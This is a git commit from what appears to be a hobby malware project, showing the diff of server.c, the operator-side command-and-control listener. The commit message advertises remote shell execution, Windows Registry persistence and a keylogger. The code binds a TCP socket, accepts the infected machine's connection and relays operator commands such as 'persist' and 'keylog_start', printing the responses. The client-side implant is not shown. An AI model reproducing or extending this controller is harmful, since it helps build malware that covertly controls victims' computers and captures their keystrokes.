c4c59ae676e43bb47d7e7219e252eb70d63c5061
dh00mk3tu <38985076+dh00mk3tu@users.noreply.github.com>
2020-05-28 17:07:44 +0000

    Major Update - 2
    I have made a lot of changes since the last commit. 
    The malware now supports
    1. Has defined Connection Points
    2. Shell Function to execute commands 
    3. Switching Directories 
    4. Persistence 
    5. Nests itself to Windows Registry
    6. Keylogger

--- server.c
+++ server.c
@@ -7,46 +7,62 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
+
+// v1.2 lmao
+// Authored By : dh00mk3tu | Anirudh Rath
 int main()
 {
-    int sock, client_sockets;
-    char buffer[1024];
-    char response[18384];
-    struct sockaddr_in server_address, client_address;
-    int i=0;
-    int optval = 1;
-    sockletn_t client_length;
+	int sock, client_socket;
+	char buffer[1024];
+	char response[18384];
+	struct sockaddr_in server_address, client_address;
+	int i=0;
+	int optval = 1;
+	socklen_t client_length;
 
-    sock = socket(AF_INET, SOCK_STREAM, 0)
-    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
-        print("\nError Setting up TCP Socket Options");
-        return 1;
-    }
+	sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    server_address.sin_family = AF_INET;
-    server_address.sin_addr.s_addr = inet_addr("192.168.0.102");
-    server_address.sin_port = htons(50005);
+	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
+		printf("Error Setting TCP Socket Options!\n");
+		return 1;
+	}
 
-    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
-    listen(sock, 5);
-    client_length = sizeof(client_address);
-    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
+	server_address.sin_family = AF_INET;
+	server_address.sin_addr.s_addr = inet_addr("192.168.1.6");
+	server_address.sin_port = htons(50005);
 
-    while(1){
-        jump:
-        bzero(&buffer, sizeof(buffer));
-        bzero(&response, sizeof(response));
-        //dir
-        printf("* Shell#%s~$", inet_ntoa(client_address.sin_addr));
-        fgets(buffer, sizeof(buffer), stdin);
-        strtok(buffer, "\n");
-        write(client_socket, buffer, sizeof(buffer));
-        if(strncmp("q", buffer, 1)==0) {
-            break;
-        }
-        else [
-            recv(client_socket, response, sizeof(response), MSG_WAITALL);
-            printf("%s", response);
-        ]
-    }
-} 
+	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
+	listen(sock, 5);
+	client_length = sizeof(client_address);
+	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
+
+	while(1)
+	{
+		jump:
+		bzero(&buffer, sizeof(buffer));
+		bzero(&response, sizeof(response));
+		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
+		fgets(buffer, sizeof(buffer), stdin);
+		strtok(buffer, "\n");
+		write(client_socket, buffer, sizeof(buffer));
+		if (strncmp("q", buffer, 1) == 0) {
+			break;
+		}
+		else if (strncmp("cd ", buffer, 3) == 0) {
+			goto jump;
+		}
+		else if (strncmp("keylog_start", buffer, 12) == 0) {
+			goto jump;
+		}
+		else if (strncmp("persist", buffer, 7) == 0) {
+			recv(client_socket, response, sizeof(response), 0);
+			printf("%s", response);
+		}
+		else {
+			recv(client_socket, response, sizeof(response), MSG_WAITALL);
+			printf("%s", response);
+		}
+
+	}
+
+}
